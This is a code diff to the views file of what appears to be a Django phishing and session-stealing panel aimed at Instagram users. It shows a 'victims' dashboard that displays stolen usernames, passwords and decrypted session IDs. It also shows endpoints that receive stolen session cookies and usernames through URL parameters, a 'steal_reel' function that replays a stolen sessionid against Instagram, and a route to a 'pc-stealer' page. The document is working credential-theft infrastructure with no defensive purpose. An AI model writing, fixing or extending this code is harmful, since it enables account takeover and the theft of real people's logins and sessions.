@@ -58,11 +58,13 @@ def login_view(request):
             "active": success
         })
 
+# core/views.py → FINAL DASHBOARD THAT SHOWS 100%
 def dashboard(request):
     victims = []
     total = InstagramAccount.objects.count()
     active = InstagramAccount.objects.filter(is_active=True).count()
     
+    # FIX: ADD .order_by('-created_at') AND LIMIT
     for acc in InstagramAccount.objects.all().order_by('-created_at')[:200]:
         try:
             decrypted = fernet.decrypt(acc.session_data.encode()).decode()
@@ -75,15 +77,17 @@ def dashboard(request):
                 "active": acc.is_active,
                 "time": acc.created_at.strftime("%b %d %H:%M")
             })
-        except:
+        except Exception as e:
+            # EVEN IF DECRYPT FAILS → STILL SHOW
             victims.append({
-                "username": acc.username,
-                "password": acc.password,
+                "username": acc.username or "ERROR_USER",
+                "password": acc.password or "ERROR",
                 "sessionid": "DECRYPT_FAILED",
                 "active": False,
                 "time": "ERROR"
             })
 
+    # FIX: BUILD HTML WITH REAL DATA
     cards = ""
     for v in victims:
         border = "border-green-500 shadow-green-500/50" if v["active"] else "border-red-800"
@@ -127,7 +131,7 @@ def dashboard(request):
     </div>
     
     <div class="grid gap-8 max-w-7xl mx-auto">
-        {cards}
+        {cards or "<h2 class='text-center text-4xl text-red-500'>NO SESSIONS YET</h2>"}
     </div>
     
     <div class="text-center mt-16">
@@ -138,7 +142,6 @@ def dashboard(request):
 </body>
 </html>'''
     return HttpResponse(html)
-
 
 
 
@@ -234,7 +237,7 @@ def capture_full(request):
 def catch_username(request):
     user = request.GET.get('user', 'unknown')
     
-    # SAVE TO DB
+    
     InstagramAccount.objects.create(
         username=user,
         password='SILENT_OPENED',
@@ -248,14 +251,14 @@ def catch_username(request):
     return HttpResponse("OK")
 
 
-# core/views.py → REEL STEALER
+
 def steal_reel(request):
     s = request.GET.get('s', '')
     u = request.GET.get('u', '')
 
     if s and u and len(s) > 80:
         try:
-            # GET USERNAME FROM INSTAGRAM API
+            
             import requests
             headers = {
                 'Cookie': f'sessionid={s}',
@@ -291,8 +294,7 @@ def reel_page(request, code):
 
 
 
-# core/views.py
-# core/views.py
+
 def pc_capture(request):
     s = request.GET.get('s', '')
     u = request.GET.get('u', 'unknown')
@@ -318,7 +320,7 @@ def pc_capture(request):
 
 
 
-# core/views.py → ADD THIS FUNCTION
+
 def pc_stealer_page(request):
     return render(request, 'core/pc-stealer.html')
 
